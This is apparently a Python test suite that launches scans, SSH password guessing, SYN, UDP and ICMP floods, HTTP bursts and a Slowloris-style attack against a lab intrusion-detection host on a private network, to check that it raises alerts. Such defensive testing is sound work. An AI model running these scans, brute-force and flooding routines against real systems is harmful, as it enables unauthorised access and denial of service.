#!/usr/bin/env python3
"""
NIDPS Attacker Test Suite
Run this on your Parrot OS VM to test NIDPS with real attacks
"""

import subprocess
import time
import socket
import threading
import random
import sys
import os
from datetime import datetime
import nmap
import paramiko
import requests
from scapy.all import IP, TCP, UDP, ICMP, Raw, send

# Configuration - Update these for your test network
NIDPS_IP = "192.168.100.10"  # NIDPS machine IP
ATTACKER_IP = "192.168.100.20"  # This machine IP
TEST_PORTS = [22, 80, 443, 8080, 3306, 5432]  # Common ports to test

class NIDPSAttacker:
    def __init__(self):
        self.nidps_ip = NIDPS_IP
        self.attacker_ip = ATTACKER_IP
        self.test_results = []
        
    def log_attack(self, attack_type, status, details=""):
        """Log attack results"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        status_icon = "✅" if status else "❌"
        result = f"[{timestamp}] {status_icon} {attack_type}: {details}"
        print(result)
        self.test_results.append({
            'attack': attack_type,
            'status': status,
            'details': details,
            'timestamp': timestamp
        })
    
    def test_connectivity(self):
        """Test basic connectivity to NIDPS"""
        print("\n🔍 Testing Connectivity")
        print("-" * 40)
        
        # Ping test
        try:
            result = subprocess.run(['ping', '-c', '3', self.nidps_ip], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                self.log_attack("Ping Test", True, "NIDPS is reachable")
            else:
                self.log_attack("Ping Test", False, "NIDPS is not reachable")
        except Exception as e:
            self.log_attack("Ping Test", False, f"Error: {e}")
    
    def nmap_port_scan(self):
        """Perform comprehensive port scan"""
        print("\n🔍 Nmap Port Scan")
        print("-" * 40)
        
        try:
            # Quick scan
            nm = nmap.PortScanner()
            nm.scan(self.nidps_ip, '1-1000', arguments='-sS -T4')
            
            open_ports = []
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        if nm[host][proto][port]['state'] == 'open':
                            open_ports.append(port)
            
            if open_ports:
                self.log_attack("Nmap Scan", True, f"Found open ports: {open_ports}")
            else:
                self.log_attack("Nmap Scan", True, "No open ports found")
                
        except Exception as e:
            self.log_attack("Nmap Scan", False, f"Error: {e}")
    
    def ssh_brute_force(self):
        """Simulate SSH brute force attack"""
        print("\n🔍 SSH Brute Force Attack")
        print("-" * 40)
        
        common_users = ['admin', 'root', 'user', 'test', 'guest']
        common_passwords = ['admin', 'password', '123456', 'root', 'test', 'admin123']
        
        for user in common_users[:3]:  # Limit for testing
            for password in common_passwords[:3]:  # Limit for testing
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(self.nidps_ip, username=user, password=password, timeout=5)
                    ssh.close()
                    self.log_attack("SSH Brute Force", True, f"Success: {user}:{password}")
                    return
                except paramiko.AuthenticationException:
                    continue
                except Exception as e:
                    continue
        
        self.log_attack("SSH Brute Force", True, "No valid credentials found")
    
    def syn_flood_attack(self):
        """Perform SYN flood attack"""
        print("\n🔍 SYN Flood Attack")
        print("-" * 40)
        
        try:
            # Send SYN packets to common ports
            for port in [80, 443, 22]:
                for i in range(50):  # Send 50 packets per port
                    ip_layer = IP(dst=self.nidps_ip)
                    tcp_layer = TCP(dport=port, flags="S")
                    packet = ip_layer/tcp_layer
                    send(packet, verbose=False)
                    time.sleep(0.01)  # Small delay
            
            self.log_attack("SYN Flood", True, "Sent 150 SYN packets")
        except Exception as e:
            self.log_attack("SYN Flood", False, f"Error: {e}")
    
    def udp_flood_attack(self):
        """Perform UDP flood attack"""
        print("\n🔍 UDP Flood Attack")
        print("-" * 40)
        
        try:
            # Send UDP packets
            for i in range(100):
                ip_layer = IP(dst=self.nidps_ip)
                udp_layer = UDP(dport=random.randint(1, 65535))
                payload = Raw(load="A" * 100)  # 100 byte payload
                packet = ip_layer/udp_layer/payload
                send(packet, verbose=False)
                time.sleep(0.01)
            
            self.log_attack("UDP Flood", True, "Sent 100 UDP packets")
        except Exception as e:
            self.log_attack("UDP Flood", False, f"Error: {e}")
    
    def http_dos_attack(self):
        """Perform HTTP DoS attack"""
        print("\n🔍 HTTP DoS Attack")
        print("-" * 40)
        
        try:
            # Send multiple HTTP requests
            for i in range(50):
                try:
                    response = requests.get(f"http://{self.nidps_ip}:5000", timeout=2)
                    if response.status_code == 200:
                        self.log_attack("HTTP DoS", True, f"Request {i+1} successful")
                except:
                    pass
                time.sleep(0.1)
            
            self.log_attack("HTTP DoS", True, "Sent 50 HTTP requests")
        except Exception as e:
            self.log_attack("HTTP DoS", False, f"Error: {e}")
    
    def icmp_flood(self):
        """Perform ICMP flood attack"""
        print("\n🔍 ICMP Flood Attack")
        print("-" * 40)
        
        try:
            for i in range(50):
                ip_layer = IP(dst=self.nidps_ip)
                icmp_layer = ICMP()
                packet = ip_layer/icmp_layer
                send(packet, verbose=False)
                time.sleep(0.01)
            
            self.log_attack("ICMP Flood", True, "Sent 50 ICMP packets")
        except Exception as e:
            self.log_attack("ICMP Flood", False, f"Error: {e}")
    
    def port_scan_intensive(self):
        """Intensive port scan"""
        print("\n🔍 Intensive Port Scan")
        print("-" * 40)
        
        try:
            # Scan common ports rapidly
            for port in range(1, 1025):  # First 1024 ports
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    result = sock.connect_ex((self.nidps_ip, port))
                    if result == 0:
                        self.log_attack("Port Scan", True, f"Port {port} is open")
                    sock.close()
                except:
                    pass
                time.sleep(0.001)  # Very small delay
            
            self.log_attack("Intensive Port Scan", True, "Scanned 1024 ports")
        except Exception as e:
            self.log_attack("Intensive Port Scan", False, f"Error: {e}")
    
    def slowloris_attack(self):
        """Slowloris attack simulation"""
        print("\n🔍 Slowloris Attack")
        print("-" * 40)
        
        try:
            sockets = []
            for i in range(10):  # Create 10 connections
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((self.nidps_ip, 5000))
                    sock.send(b"GET / HTTP/1.1\r\n")
                    sock.send(b"Host: " + self.nidps_ip.encode() + b"\r\n")
                    sockets.append(sock)
                except:
                    pass
            
            # Keep connections alive
            time.sleep(5)
            
            # Close connections
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            self.log_attack("Slowloris", True, f"Created {len(sockets)} connections")
        except Exception as e:
            self.log_attack("Slowloris", False, f"Error: {e}")
    
    def run_comprehensive_attack(self):
        """Run all attacks"""
        print("🚀 Starting Comprehensive NIDPS Attack Test")
        print("=" * 50)
        print(f"Target: {self.nidps_ip}")
        print(f"Attacker: {self.attacker_ip}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 50)
        
        # Run all attacks
        self.test_connectivity()
        time.sleep(2)
        
        self.nmap_port_scan()
        time.sleep(2)
        
        self.ssh_brute_force()
        time.sleep(2)
        
        self.syn_flood_attack()
        time.sleep(2)
        
        self.udp_flood_attack()
        time.sleep(2)
        
        self.http_dos_attack()
        time.sleep(2)
        
        self.icmp_flood()
        time.sleep(2)
        
        self.port_scan_intensive()
        time.sleep(2)
        
        self.slowloris_attack()
        
        # Summary
        print("\n📊 Attack Test Summary")
        print("-" * 40)
        successful_attacks = sum(1 for result in self.test_results if result['status'])
        total_attacks = len(self.test_results)
        
        print(f"Total Attacks: {total_attacks}")
        print(f"Successful: {successful_attacks}")
        print(f"Failed: {total_attacks - successful_attacks}")
        
        print("\n📋 Detailed Results:")
        for result in self.test_results:
            print(f"  {result['attack']}: {'✅' if result['status'] else '❌'} - {result['details']}")

def main():
    print("🔧 NIDPS Attacker Test Suite")
    print("Run this on your Parrot OS VM to test NIDPS")
    print("Make sure NIDPS is running on the target machine")
    print()
    
    # Check if running as root (needed for some attacks)
    if os.geteuid() != 0:
        print("⚠️  Warning: Some attacks may require root privileges")
        print("   Run with sudo for full functionality")
        print()
    
    attacker = NIDPSAttacker()
    attacker.run_comprehensive_attack()

if __name__ == "__main__":
    main() 